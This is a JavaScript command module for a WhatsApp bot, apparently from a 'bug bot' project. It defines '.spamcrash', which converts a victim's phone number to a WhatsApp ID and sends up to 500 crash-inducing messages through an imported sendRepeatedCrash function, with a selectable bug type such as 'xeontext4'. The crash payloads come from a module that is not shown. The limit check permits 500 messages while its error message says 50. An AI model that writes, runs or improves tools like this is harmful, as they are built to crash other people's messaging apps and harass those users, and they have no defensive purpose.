const fs = require('fs');
const path = require('path');
const { sendRepeatedCrash } = require('../lib/bugfunctions');

// convert number → JID
function toJid(number) {
  return number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
}

// check whitelist
function isWhitelisted(senderNumber) {
  try {
    const whitelistPath = path.join(__dirname, '../whitelist.json');
    const whitelist = JSON.parse(fs.readFileSync(whitelistPath));

    return whitelist.includes(senderNumber);
  } catch (err) {
    console.error('Whitelist error:', err);
    return false;
  }
}

async function spamcrashCommand(sock, chatId, message) {
  try {
    // ❌ Block group usage
    const isGroup = chatId.endsWith('@g.us');
    if (isGroup) {
      return sock.sendMessage(chatId, {
        text: '❌ This command works only in private chat'
      }, { quoted: message });
    }

    // get message text
    const rawText =
      message.message?.conversation ||
      message.message?.extendedTextMessage?.text ||
      "";

    const args = rawText.trim().split(/\s+/);

    // get sender
    const sender =
      message.key.participant || message.key.remoteJid;

    const senderNumber = sender.split('@')[0];

    // ❌ whitelist check
    if (!isWhitelisted(senderNumber)) {
      return sock.sendMessage(chatId, {
        text: '❌ You are not whitelisted to use this command'
      }, { quoted: message });
    }

    // get arguments
    const count = parseInt(args[1]);
    const number = args[2];

    if (!count || !number) {
      return sock.sendMessage(chatId, {
        text: '❌ Usage: .spamcrash <count> <number>\nExample: .spamcrash 5 2547xxxxxxx'
      }, { quoted: message });
    }

    // limit protection
    if (count > 500) {
      return sock.sendMessage(chatId, {
        text: '❌ Maximum 50 messages allowed'
      }, { quoted: message });
    }

    const target = toJid(number);
    const bugType = args[3] || 'xeontext4';

    await sock.sendMessage(chatId, {
      text: `⏳ Sending ${count} crash messages to ${number}...`
    }, { quoted: message });

    await sendRepeatedCrash(sock, target, count, bugType);

    await sock.sendMessage(chatId, {
      text: `✅ Spam crash sent (${count}) to ${number}`
    }, { quoted: message });

  } catch (error) {
    console.error('Spam Crash Command Error:', error);

    await sock.sendMessage(chatId, {
      text: `❌ Error: ${error.message}`
    }, { quoted: message }).catch(() => {});
  }
}

module.exports = spamcrashCommand;
